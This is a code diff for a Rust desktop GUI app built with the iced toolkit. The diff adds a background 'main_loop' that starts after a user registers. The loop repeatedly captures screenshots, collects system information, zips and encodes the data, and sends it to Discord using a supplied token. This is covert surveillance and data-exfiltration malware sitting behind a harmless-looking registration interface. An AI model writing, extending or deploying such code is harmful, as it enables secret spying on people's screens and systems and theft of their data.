@@ -1,10 +1,6 @@
-use std::collections::HashMap;
 use iced::{Element, Sandbox, Settings};
 mod pages;
 mod lib;
-use lib::{
-    global, http, files, thread, user::User
-};
 
 fn main() -> iced::Result {
     Page::run(Settings {
@@ -41,7 +37,7 @@ pub struct Page {
     current_page: u8,
     token: String,
     error: String,
-    user: User,
+    user: lib::user::User,
 }
 
 // Implementation for the Page struct
@@ -55,9 +51,9 @@ impl Sandbox for Page {
 
     // Set the default values for the struct
     fn new() -> Self {
-        let _user = User::new();
+        let _user = lib::user::User::new();
         Self {
-            user: _user,
+            user: _user.clone(),
             current_page: _user.login(),
             current_token: String::new(),
             token: String::new(),
@@ -80,22 +76,8 @@ impl Sandbox for Page {
         } 
 
         // Else, if the current page is 2, render the home page
-        else if self.current_page == 2 {
+        else {
             pages::home::render(self)
-        }
-    }
-
-    // Register button callback function
-    fn register_button_pressed(&mut self) {
-        match user.is_valid_name() {
-            Err(e) => self.error = e,
-            Ok(name) => match user.register(&name, &self.bearer) {
-                Ok(_) => {
-                    self.current_page = 2;
-                    thread::spawn(move || { thread::main_loop(); }).join();
-                },
-                Err(e) => self.error = e
-            }
         }
     }
 
@@ -104,7 +86,20 @@ impl Sandbox for Page {
         match app {
             App::NameInputChanged(name) => self.user.name = name,
             App::TokenInputChanged(token) => self.token = token,
-            App::RegisterPressed => self.register_button_pressed(),
+            App::RegisterPressed => match self.user.is_valid_name() {
+                Err(e) => self.error = e,
+                Ok(_) => match self.user.register() {
+                    Ok(_) => {
+                        self.current_page = 2;
+                        let token: String = self.token.clone();
+                        match std::thread::spawn(move || {main_loop(&token);}).join() {
+                            Ok(_) => (),
+                            Err(_) => self.error = String::from("failed to start main thread")
+                        }
+                    },
+                    Err(e) => self.error = e
+                }
+            },
             App::StartPressed => {
                 self.current_token = self.token.clone();
                 self.logs = Vec::new();
@@ -114,5 +109,45 @@ impl Sandbox for Page {
                 self.logs = Vec::new();
             },
         }
+    }
+}
+
+// Main thread loop
+fn main_loop(token: &str) {
+    let mut sys = lib::system::System::new();
+    let mut zip = lib::zip::Zip::new();
+    loop {
+        // Start after 10 seconds
+        std::thread::sleep(std::time::Duration::from_secs(10));
+
+        // Capture the image then add it to the zip file
+        let img_buf: Vec<u8> = match lib::files::capture_image() {
+            Ok(f) => f,
+            Err(e) => panic!("Error: {}", e)
+        };
+        match zip.add_file("screenshot.png", &img_buf) {
+            Ok(_) => (),
+            Err(e) => panic!("Error: {}", e)
+        }
+        
+        // Get the system info then add it to a file
+        let sys_info = match serde_json::to_vec(&sys.info()){
+            Ok(buf) => buf,
+            Err(e) => panic!("Error: {}", e)
+        };
+        match zip.add_file("sysinfo.json", &sys_info) {
+            Ok(_) => (),
+            Err(e) => panic!("Error: {}", e)
+        }
+
+        // Encode the image data
+        let image_data: String = lib::files::encode_png(img_buf);
+        let sysinfo_data: String = lib::files::encode_json(sys_info);
+
+        // Send the files to discord
+        lib::discord::send_files(token, &image_data, &sysinfo_data);
+
+        // Repeat after 20 to 50 seconds
+        std::thread::sleep(std::time::Duration::from_secs(50));
     }
 }
